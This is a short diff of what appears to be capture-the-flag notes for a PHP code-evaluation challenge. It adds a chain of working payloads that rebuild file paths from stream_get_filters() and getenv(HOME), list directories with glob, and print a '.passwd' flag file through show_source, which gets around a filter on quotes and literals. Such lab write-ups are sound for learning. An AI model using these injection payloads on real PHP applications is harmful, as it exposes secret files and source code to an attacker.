@@ -8,3 +8,34 @@ print_r(get_class_methods(get_declared_classes()[42])[2]('ch13.php'))
 get_class_methods(get_declared_classes()[77])->getInode
 
 print_r(get_class_methods(get_declared_classes()[77])[32]->getName())
+
+
+
+
+
+================================================
+
+// wildcard
+print_r(stream_get_filters()[0][4])
+
+// path to search + wildcard
+print_r(implode(getenv(HOME)[0], [getenv(HOME),stream_get_filters()[0][5],  ]))
+
+// list current dir
+print_r(glob(implode(getenv(HOME)[0], [getenv(HOME),stream_get_filters()[0][5],  ])))
+
+//passwd path
+implode(getenv(HOME)[0], [getenv(HOME),passwd,stream_get_filters()[0][5],  ])
+
+// simple way to ls /challenge/app-script/ch13/passwd
+print_r(glob(implode(getenv(HOME)[0], [getenv(HOME),passwd,stream_get_filters()[0][5],  ])))
+
+// complicated way to ls /challenge/app-script/ch13/passwd
+print_r(glob(implode(getenv(HOME)[0],[glob(implode(getenv(HOME)[0], [getenv(HOME),stream_get_filters()[0][5],  ]))[1],stream_get_filters()[0][5],  ])))
+
+// build .passwd filename
+implode(pas, [stream_get_filters()[0][4], swd,  ])
+
+// show passwd content
+print_r(show_source(implode(getenv(HOME)[0], [getenv(HOME),passwd, implode(pas, [stream_get_filters()[0][4], swd,  ]), ])))
+
